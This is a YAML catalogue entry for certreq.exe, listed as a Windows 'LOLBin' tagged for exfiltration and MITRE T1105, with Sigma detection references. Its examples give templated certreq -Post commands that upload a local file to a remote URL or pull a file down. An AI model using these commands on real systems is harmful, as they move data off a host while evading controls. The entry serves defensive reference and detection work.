---
id: windows-download-certreq
namespace: windows:download:certreq
name: certreq
description: 'Used for requesting and managing certificates Located at: C:\Windows\System32\certreq.exe;
  C:\Windows\SysWOW64\certreq.exe.'
author: David Middlehurst
version: 1.0.0
capabilities:
- network.transfer.download
- network.transfer.upload
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- certreq
parameters: []
features:
- encryption
- network-intensive
- pipes-stdin
- pipes-stdout
execution:
  template: certreq
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Send the specified file (penultimate argument) to the specified URL
    via HTTP POST and save the response to the specified txt file (last argument).
    (Download file from Internet)
  command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
- description: Send the specified file (last argument) to the specified URL via HTTP
    POST and show response in terminal. (Upload)
  command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
references:
- label: certreq
  url: https://dtm.uk/certreq
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
- type: ioc
  description: certreq creates new files
- type: ioc
  description: certreq makes POST requests
install:
- method: choco
  package_name: certreq
  commands:
  - choco install certreq
---

# certreq

certreq is a Windows LOLBin. Used for requesting and managing certificates Located at: C:\Windows\System32\certreq.exe; C:\Windows\SysWOW64\certreq.exe.
